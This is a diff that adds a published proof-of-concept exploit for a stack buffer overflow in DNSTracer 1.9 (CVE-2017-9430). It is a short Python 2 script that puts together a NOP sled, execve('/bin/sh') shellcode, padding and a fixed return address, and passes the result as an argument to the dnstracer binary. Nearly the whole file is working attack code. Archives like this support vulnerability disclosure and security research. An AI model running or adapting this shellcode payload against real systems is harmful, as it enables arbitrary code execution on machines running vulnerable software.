@@ -1,0 +1,46 @@
+# Exploit Title: DNSTracer 1.9 - Buffer Overflow
+# Google Dork: [if applicable]
+# Date: 03-08-2017
+# Exploit Author: j0lama
+# Vendor Homepage: http://www.mavetju.org/unix/dnstracer.php
+# Software Link: http://www.mavetju.org/download/dnstracer-1.9.tar.gz
+# Version: 1.9
+# Tested on: Ubuntu 12.04
+# CVE : CVE-2017-9430
+# Bug report: https://www.exploit-db.com/exploits/42115/
+# Vulnerability analysis: http://jolama.es/temas/dnstracer-exploit/index.php
+
+
+# Proof of Concept
+import os
+from subprocess import call
+
+def run():
+    try:
+        print "\nDNSTracer Stack-based Buffer Overflow"
+        print "Author: j0lama"
+        print "Tested with Dnstracer compile without buffer overflow protection"
+
+        nops = "\x90"*1006
+        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+        filling = "A"*24
+        eip = "\x2f\xeb\xff\xbf"
+
+        #buf size = 1057
+        buf = nops + shellcode + filling + eip
+
+        call(["./dnstracer", buf])
+
+    except OSError as e:
+        if e.errno == os.errno.ENOENT:
+            print "\nDnstracer not found!\n"
+        else:
+            print "\nError executing exploit\n"
+        raise
+
+
+if __name__ == '__main__':
+    try:
+        run()
+    except Exception as e:
+        print "Something went wrong"
